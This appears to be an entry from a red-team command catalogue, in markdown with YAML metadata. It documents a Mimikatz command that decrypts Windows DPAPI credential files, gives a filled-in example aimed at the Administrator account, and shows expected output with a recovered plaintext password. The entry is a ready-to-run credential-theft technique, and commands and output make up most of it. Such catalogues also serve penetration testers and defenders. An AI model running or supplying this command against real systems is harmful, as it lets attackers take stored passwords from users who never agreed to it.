---
type: command
executor: cmd
data: >-
  mimikatz.exe "dpapi::cred
  /in:C:\Users\$_USERNAME\AppData\Local\Microsoft\Credentials\$_CREDENTIAL_GUID"
platforms:
  - Windows
tags:
  - decryption
  - dpapi
  - mimikatz
verified: true
validated: true
---

# mimikatz-dpapi-cred-decrypt-file

## Command

```cmd
mimikatz.exe "dpapi::cred /in:C:\Users\$_USERNAME\AppData\Local\Microsoft\Credentials\$_CREDENTIAL_GUID"
```

## Description

Attempts to decrypt a specific DPAPI credential blob using the current session context in Mimikatz.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_USERNAME | Target username | Yes |
| $_CREDENTIAL_GUID | GUID of the credential file (e.g., 2647629F5AA74CD934ECD2F88D64ECD0) | Yes |
| /in: | Input path to the credential file | Yes |

## Examples

### Basic Usage

```cmd
mimikatz.exe "dpapi::cred /in:C:\Users\Administrator\AppData\Local\Microsoft\Credentials\2647629F5AA74CD934ECD2F88D64ECD0"
```

## Expected Output

```
* DPAPI credential :
  * File       : 'C:\Users\Administrator\AppData\Local\Microsoft\Credentials\2647629F5AA74CD934ECD2F88D64ECD0'
  * Data type  : https://login.live.com
  * User cred  : PID=1234 / user=Administrator (S-1-5-21-...)
  * Password   : plaintext_password_here
```

## Related

- [[procedures/Windows-DPAPI-Credential-Retrieval-with-Mimikatz]]
